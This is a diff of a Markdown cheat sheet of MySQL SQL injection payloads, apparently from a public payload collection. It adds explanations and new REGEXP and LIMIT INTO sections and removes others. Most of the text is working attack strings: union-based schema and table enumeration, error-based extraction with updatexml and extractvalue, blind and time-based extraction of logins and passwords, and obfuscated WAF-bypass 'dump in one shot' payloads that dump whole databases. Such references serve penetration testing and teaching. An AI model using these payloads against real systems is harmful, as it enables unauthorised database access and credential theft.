@@ -7,23 +7,28 @@
 
 * [MYSQL Default Databases](#mysql-default-databases)
 * [MYSQL Comments](#mysql-comments)
+* [MYSQL Testing Injection](#mysql-testing-injection)
 * [MYSQL Union Based](#mysql-union-based)
-    * [Detect columns number](#detect-columns-number)
-    * [Extract database with information_schema](#extract-database-with-information_schema)
-    * [Extract columns name without information_schema](#extract-columns-name-without-information_schema)
-    * [Extract data without columns name](#extract-data-without-columns-name)
+    * [Detect Columns Number](#detect-columns-number)
+        * [Iterative NULL Method](#iterative-null-method)
+        * [ORDER BY Method](#order-by-method)
+        * [LIMIT INTO Method](#limit-into-method)
+    * [Extract Database With Information_schema](#extract-database-with-information_schema)
+    * [Extract Columns Name Without Information_Schema](#extract-columns-name-without-information_schema)
+    * [Extract Data Without Columns Name](#extract-data-without-columns-name)
 * [MYSQL Error Based](#mysql-error-based)
     * [MYSQL Error Based - Basic](#mysql-error-based---basic)
-    * [MYSQL Error Based - UpdateXML function](#mysql-error-based---updatexml-function)
-    * [MYSQL Error Based - Extractvalue function](#mysql-error-based---extractvalue-function)
+    * [MYSQL Error Based - UpdateXML Function](#mysql-error-based---updatexml-function)
+    * [MYSQL Error Based - Extractvalue Function](#mysql-error-based---extractvalue-function)
 * [MYSQL Blind](#mysql-blind)
-    * [MYSQL Blind with substring equivalent](#mysql-blind-with-substring-equivalent)
-    * [MYSQL Blind using a conditional statement](#mysql-blind-using-a-conditional-statement)
-    * [MYSQL Blind with MAKE_SET](#mysql-blind-with-make_set)
-    * [MYSQL Blind with LIKE](#mysql-blind-with-like)
+    * [MYSQL Blind With Substring Equivalent](#mysql-blind-with-substring-equivalent)
+    * [MYSQL Blind Using A Conditional Statement](#mysql-blind-using-a-conditional-statement)
+    * [MYSQL Blind With MAKE_SET](#mysql-blind-with-make_set)
+    * [MYSQL Blind With LIKE](#mysql-blind-with-like)
+    * [MySQL Blind With REGEXP](#mysql-blind-with-regexp)
 * [MYSQL Time Based](#mysql-time-based)
-    * [Using SLEEP in a subselect](#using-sleep-in-a-subselect)
-    * [Using conditional statements](#using-conditional-statements)
+    * [Using SLEEP in a Subselect](#using-sleep-in-a-subselect)
+    * [Using Conditional Statements](#using-conditional-statements)
 * [MYSQL DIOS - Dump in One Shot](#mysql-dios---dump-in-one-shot)
 * [MYSQL Current Queries](#mysql-current-queries)
 * [MYSQL Read Content of a File](#mysql-read-content-of-a-file)
@@ -33,13 +38,13 @@
     * [COMMAND - UDF Library](#udf-library)
 * [MYSQL INSERT](#mysql-insert)
 * [MYSQL Truncation](#mysql-truncation)
-* [MYSQL json_arrayagg](#mysql-json_arrayagg)
 * [MYSQL Out of Band](#mysql-out-of-band)
     * [DNS Exfiltration](#dns-exfiltration)
     * [UNC Path - NTLM Hash Stealing](#unc-path---ntlm-hash-stealing)
 * [MYSQL WAF Bypass](#mysql-waf-bypass)
     * [Alternative to Information Schema](#alternative-to-information-schema)
-    * [Alternative to version](#alternative-to-version)
+    * [Alternative to Version](#alternative-to-version)
+    * [Alternative to group_concat](#alternative-to-group_concat)
     * [Scientific Notation](#scientific-notation)
     * [Conditional Comments](#conditional-comments)
     * [Wide Byte Injection (GBK)](#wide-byte-injection-gbk)
@@ -54,7 +59,9 @@
 | information_schema | Available from version 5 and higher |
 	
 
-## MYSQL comments
+## MYSQL Comments
+
+MySQL comments are annotations in SQL code that are ignored by the MySQL server during execution.
 
 | Type                       | Description                       |
 |----------------------------|-----------------------------------|
@@ -105,127 +112,113 @@
 
 ## MYSQL Union Based
 
-### Detect columns number
+### Detect Columns Number
 
-First you need to know the number of columns
+To successfully perform a union-based SQL injection, an attacker needs to know the number of columns in the original query.
 
-##### Using `order by` or `group by`
 
-Keep incrementing the number until you get a False response.
-Even though GROUP BY and ORDER BY have different functionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query.
+#### Iterative NULL Method
 
-```sql
-1' ORDER BY 1--+	#True
-1' ORDER BY 2--+	#True
-1' ORDER BY 3--+	#True
-1' ORDER BY 4--+	#False - Query is only using 3 columns
-                        #-1' UNION SELECT 1,2,3--+	True
-```
-or 
-```sql
-1' GROUP BY 1--+	#True
-1' GROUP BY 2--+	#True
-1' GROUP BY 3--+	#True
-1' GROUP BY 4--+	#False - Query is only using 3 columns
-                        #-1' UNION SELECT 1,2,3--+	True
-```
-##### Using `order by` or `group by` Error Based
-Similar to the previous method, we can check the number of columns with 1 request if error showing is enabled.
-```sql
-1' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+
-
-# Unknown column '4' in 'order clause'
-# This error means query uses 3 column
-#-1' UNION SELECT 1,2,3--+	True
-```
-or
-```sql
-1' GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+
-
-# Unknown column '4' in 'group statement'
-# This error means query uses 3 column
-#-1' UNION SELECT 1,2,3--+	True
-```
-##### Using `UNION SELECT` Error Based
-This method works if error showing is enabled
-```sql
-1' UNION SELECT @--+        #The used SELECT statements have a different number of columns
-1' UNION SELECT @,@--+      #The used SELECT statements have a different number of columns
-1' UNION SELECT @,@,@--+    #No error means query uses 3 column
-                            #-1' UNION SELECT 1,2,3--+	True
-```
-##### Using `LIMIT INTO` Error Based
-This method works if error showing is enabled.
-
-It is useful for finding the number of columns when the injection point is after a LIMIT clause.
-```sql
-1' LIMIT 1,1 INTO @--+        #The used SELECT statements have a different number of columns
-1' LIMIT 1,1 INTO @,@--+      #The used SELECT statements have a different number of columns
-1' LIMIT 1,1 INTO @,@,@--+    #No error means query uses 3 column
-                              #-1' UNION SELECT 1,2,3--+	True
-```
-##### Using `SELECT * FROM SOME_EXISTING_TABLE` Error Based
-This works if you know the table name you're after and error showing is enabled.
-
-It will return the amount of columns in the table, not the query.
+Systematically increase the number of columns in the `UNION SELECT` statement until the payload executes without errors or produces a visible change. Each iteration checks the compatibility of the column count.
 
 ```sql
-1' AND (SELECT * FROM Users) = 1--+ 	#Operand should contain 3 column(s)
-                                        # This error means query uses 3 column
-                                        #-1' UNION SELECT 1,2,3--+	True
+UNION SELECT NULL;--
+UNION SELECT NULL, NULL;-- 
+UNION SELECT NULL, NULL, NULL;-- 
 ```
-### Extract database with information_schema
 
-Then the following codes will extract the databases'name, tables'name, columns'name.
+
+#### ORDER BY Method
+
+Keep incrementing the number until you get a `False` response. Even though `GROUP BY` and `ORDER BY` have different functionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query.
+
+| ORDER BY        | GROUP BY        | Result |
+| --------------- | --------------- | ------ |
+| `ORDER BY 1--+` | `GROUP BY 1--+` | True   |
+| `ORDER BY 2--+` | `GROUP BY 2--+` | True   |
+| `ORDER BY 3--+` | `GROUP BY 3--+` | True   |
+| `ORDER BY 4--+` | `GROUP BY 4--+` | False  |
+
+Since the result is false for `ORDER BY 4`, it means the SQL query is only having 3 columns.
+In the `UNION` based SQL injection, you can `SELECT` arbitrary data to display on the page: `-1' UNION SELECT 1,2,3--+`.
+
+Similar to the previous method, we can check the number of columns with one request if error showing is enabled.
 
 ```sql
-UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
-UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
-UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
-UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
+ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # Unknown column '4' in 'order clause'
 ```
 
-### Extract columns name without information_schema
+
+#### LIMIT INTO Method
+
+This method is effective when error reporting is enabled. It can help determine the number of columns in cases where the injection point occurs after a LIMIT clause. 
+
+| Payload                      | Error           |
+| ---------------------------- | --------------- |
+| `1' LIMIT 1,1 INTO @--+`     | `The used SELECT statements have a different number of columns` |
+| `1' LIMIT 1,1 INTO @,@--+ `  | `The used SELECT statements have a different number of columns` |
+| `1' LIMIT 1,1 INTO @,@,@--+` | `No error means query uses 3 columns` |
+
+Since the result doesn't show any error it means the query uses 3 columns: `-1' UNION SELECT 1,2,3--+`.
+
+
+### Extract Database With Information_Schema
+
+This query retrieves the names of all schemas (databases) on the server.
+
+```sql
+UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata
+```
+
+This query retrieves the names of all tables within a specified schema (the schema name is represented by PLACEHOLDER).
+
+```sql
+UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=PLACEHOLDER
+```
+
+This query retrieves the names of all columns in a specified table.
+
+```sql
+UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name=...
+```
+
+This query aims to retrieve data from a specific table.
+
+```sql
+UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,data,0x7C) FROM ...
+```
+
+
+### Extract Columns Name Without Information_Schema
 
 Method for `MySQL >= 4.1`.
 
-First extract the column number with 
-```sql
-?id=(1)and(SELECT * from db.users)=(1)
--- Operand should contain 4 column(s)
-```
-
-Then extract the column name.
-```sql
-?id=1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)
---Column 'id' cannot be null
-```
+| Payload | Output |
+| --- | --- |
+| `(1)and(SELECT * from db.users)=(1)` | Operand should contain **4** column(s) |
+| `1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)` | Column '**id**' cannot be null |
 
 Method for `MySQL 5`
 
-```sql
--1 UNION SELECT * FROM (SELECT * FROM users JOIN users b)a
---#1060 - Duplicate column name 'id'
+| Payload | Output |
+| --- | --- |
+| `UNION SELECT * FROM (SELECT * FROM users JOIN users b)a` | Duplicate column name '**id**' |
+| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a` | Duplicate column name '**name**' |
+| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a` | Data |
 
--1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a
--- #1060 - Duplicate column name 'name'
 
--1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a
-...
-```
-
-### Extract data without columns name 
+### Extract Data Without Columns Name 
 
 Extracting data from the 4th column without knowing its name.
 
 ```sql
-select `4` from (select 1,2,3,4,5,6 union select * from users)dbname;
+SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;
 ```
 
 Injection example inside the query `select author_id,title from posts where author_id=[INJECT_HERE]`
 
 ```sql
-MariaDB [dummydb]> select author_id,title from posts where author_id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1);
+MariaDB [dummydb]> SELECT AUTHOR_ID,TITLE FROM POSTS WHERE AUTHOR_ID=-1 UNION SELECT 1,(SELECT CONCAT(`3`,0X3A,`4`) FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)A LIMIT 1,1);
 +-----------+-----------------------------------------------------------------+
 | author_id | title                                                           |
 +-----------+-----------------------------------------------------------------+
@@ -241,12 +234,12 @@ MariaDB [dummydb]> select author_id,title from posts where author_id=-1 union se
 Works with `MySQL >= 4.1`
 
 ```sql
-(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
-'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'
+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))
+'+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))+'
 ```
 
 
-### MYSQL Error Based - UpdateXML function
+### MYSQL Error Based - UpdateXML Function
 
 ```sql
 AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-
@@ -259,21 +252,21 @@ AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) F
 Shorter to read:
 
 ```sql
-' and updatexml(null,concat(0x0a,version()),null)-- -
-' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
+updatexml(null,concat(0x0a,version()),null)-- -
+updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
 ```
 
 
-### MYSQL Error Based - Extractvalue function
+### MYSQL Error Based - Extractvalue Function
 
 Works with `MySQL >= 5.1`
 
 ```sql
-?id=1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--
-?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
-?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
-?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
-?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_column,CHAR(126)) FROM data_schema.data_table LIMIT data_offset,1)))--
+?id=1 AND EXTRACTVALUE(RAND(),CONCAT(CHAR(126),VERSION(),CHAR(126)))--
+?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
+?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),table_name,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
+?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
+?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),data_column,CHAR(126)) FROM data_schema.data_table LIMIT data_offset,1)))--
 ```
 
 
@@ -290,7 +283,7 @@ Works with `MySQL >= 5.0`
 
 ## MYSQL Blind
 
-### MYSQL Blind with substring equivalent
+### MYSQL Blind With Substring Equivalent
 
 | Function | Example | Description |
 | --- | --- | --- |
@@ -300,7 +293,7 @@ Works with `MySQL >= 5.0`
 | `MID` | `MID(version(),1,1)=4` | Extracts a substring from a string (starting at any position) |
 | `LEFT` | `LEFT(version(),1)=4` | Extracts a number of characters from a string (starting from left) |
 
-Examples of Blind SQL injection using SUBSTRING or another equivalent function:
+Examples of Blind SQL injection using `SUBSTRING` or another equivalent function:
 
 ```sql
 ?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
@@ -308,64 +301,44 @@ Examples of Blind SQL injection using SUBSTRING or another equivalent function:
 ?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51
 ```
 
-### MySQL Blind SQL Injection in ORDER BY clause using a binary query and REGEXP
 
-This query basically orders by one column or the other, depending on whether the EXISTS() returns a 1 or not.
-For the EXISTS() function to return a 1, the REGEXP query needs to match up, this means you can bruteforce blind values character by character and leak data from the database without direct output.
+### MYSQL Blind Using a Conditional Statement
 
-```SQL
-[...] ORDER BY (SELECT (CASE WHEN EXISTS(SELECT [COLUMN] FROM [TABLE] WHERE [COLUMN] REGEXP "^[BRUTEFORCE CHAR BY CHAR].*" AND [FURTHER OPTIONS / CONDITIONS]) THEN [ONE COLUMN TO ORDER BY] ELSE [ANOTHER COLUMN TO ORDER BY] END)); -- -
-```
+* TRUE: `if @@version starts with a 5`:
 
-### MySQL Blind SQL Injection binary query using REGEXP.
+    ```sql
+    2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
+    Response:
+    HTTP/1.1 500 Internal Server Error
+    ```
 
-Payload:
+* FALSE: `if @@version starts with a 4`:
 
-```sql
-' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); -- -
-```
-
-Would work in the query (where the "where" clause is the injection point):
-
-```SQL
-SELECT name,price FROM items WHERE name = '' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); -- -';
-```
-
-In said query, it will check to see if an item exists in the "name" column in the "items" database that starts with an "a". If it will sleep for 3 seconds per item.
+    ```sql
+    2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2
+    Response:
+    HTTP/1.1 200 OK
+    ```
 
 
-### MYSQL Blind using a conditional statement
-
-TRUE: `if @@version starts with a 5`:
+### MYSQL Blind With MAKE_SET
 
 ```sql
-2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
-Response:
-HTTP/1.1 500 Internal Server Error
-```
-
-False: `if @@version starts with a 4`:
-
-```sql
-2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2
-Response:
-HTTP/1.1 200 OK
+AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(version()))),1)
+AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(version(),POS,1)),1)
+AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(concat(login,password)))),1)
+AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(concat(login,password),POS,1)),1)
 ```
 
 
-### MYSQL Blind with MAKE_SET
+### MYSQL Blind With LIKE
 
-```sql
-AND MAKE_SET(YOLO<(SELECT(length(version()))),1)
-AND MAKE_SET(YOLO<ascii(substring(version(),POS,1)),1)
-AND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)
-AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)
-```
+In MySQL, the `LIKE` operator can be used to perform pattern matching in queries. The operator allows the use of wildcard characters to match unknown or partial string values. This is especially useful in a blind SQL injection context when an attacker does not know the length or specific content of the data stored in the database.
 
+Wildcard Characters in LIKE:
 
-### MYSQL Blind with LIKE
-
-['_'](https://www.w3resource.com/sql/wildcards-like-operator/wildcards-underscore.php) acts like the regex character '.', use it to speed up your blind testing
+* **Percentage Sign** (`%`): This wildcard represents zero, one, or multiple characters. It can be used to match any sequence of characters.
+* **Underscore** (`_`): This wildcard represents a single character. It's used for more precise matching when you know the structure of the data but not the specific character at a particular position.
 
 ```sql
 SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
@@ -373,44 +346,76 @@ SELECT * FROM products WHERE product_name LIKE '%user_input%'
 ```
 
 
+### MySQL Blind with REGEXP
+
+Blind SQL injection can also be performed using the MySQL `REGEXP` operator, which is used for matching a string against a regular expression. This technique is particularly useful when attackers want to perform more complex pattern matching than what the `LIKE` operator can offer.
+
+| Payload | Description |
+| --- | --- |
+| `' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --` | Checking length |
+| `' OR (SELECT username FROM users WHERE username REGEXP '[0-9]') --`   | Checking for the presence of digits |
+| `' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --` | Checking for data starting by "a" |
+
+
 ## MYSQL Time Based
 
 The following SQL codes will delay the output from MySQL.
 
-* MySQL 4/5 : `BENCHMARK()`
+* MySQL 4/5 : [`BENCHMARK()`](https://dev.mysql.com/doc/refman/8.4/en/select-benchmarking.html)
     ```sql
     +BENCHMARK(40000000,SHA1(1337))+
-    '%2Bbenchmark(3200,SHA1(1))%2B'
-    AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))  //SHA1
+    '+BENCHMARK(3200,SHA1(1))+'
+    AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
     ```
-* MySQL 5: `SLEEP()`
+
+* MySQL 5: [`SLEEP()`](https://dev.mysql.com/doc/refman/8.4/en/miscellaneous-functions.html#function_sleep)
     ```sql
     RLIKE SLEEP([SLEEPTIME])
     OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
     XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR
     ```
 
-### Using SLEEP in a subselect
+### Using SLEEP in a Subselect
 
-```powershell
-1 and (select sleep(10) from dual where database() like '%')#
-1 and (select sleep(10) from dual where database() like '___')# 
-1 and (select sleep(10) from dual where database() like '____')#
-1 and (select sleep(10) from dual where database() like '_____')#
-1 and (select sleep(10) from dual where database() like 'a____')#
-...
-1 and (select sleep(10) from dual where database() like 's____')#
-1 and (select sleep(10) from dual where database() like 'sa___')#
-...
-1 and (select sleep(10) from dual where database() like 'sw___')#
-1 and (select sleep(10) from dual where database() like 'swa__')#
-1 and (select sleep(10) from dual where database() like 'swb__')#
-1 and (select sleep(10) from dual where database() like 'swi__')#
-...
-1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#
+Extracting the length of the data.
+
+```sql
+1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#
+1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '___')# 
+1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '____')#
+1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '_____')#
 ```
 
-### Using conditional statements
+Extracting the first character.
+
+```sql
+1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'A____')#
+1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'S____')#
+```
+
+Extracting the second character.
+
+```sql
+1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SA___')#
+1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SW___')#
+```
+
+Extracting the third character.
+
+```sql
+1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWA__')#
+1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWB__')#
+1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWI__')#
+```
+
+Extracting column_name.
+
+```sql
+1 AND (SELECT SLEEP(10) FROM DUAL WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=DATABASE() AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%')#
+```
+
+
+### Using Conditional Statements
 
 ```sql
 ?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1)))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
@@ -421,63 +426,87 @@ The following SQL codes will delay the output from MySQL.
 
 ## MYSQL DIOS - Dump in One Shot
 
+DIOS (Dump In One Shot) SQL Injection is an advanced technique that allows an attacker to extract entire database contents in a single, well-crafted SQL injection payload. This method leverages the ability to concatenate multiple pieces of data into a single result set, which is then returned in one response from the database.
+
 ```sql
 (select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#
-
 (select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#
-
--- SecurityIdiots
-make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
-
--- Profexer
-(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)
-
--- Dr.Z3r0
-(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))
-
--- M@dBl00d
-(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
-
--- Zen
-+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
-
--- Zen WAF
-(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)
-
--- ~tr0jAn WAF
-+concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/+
-
--- ~tr0jAn Benchmark
-+concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name>@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name>@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name>@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)+
-
--- N1Z4M WAF
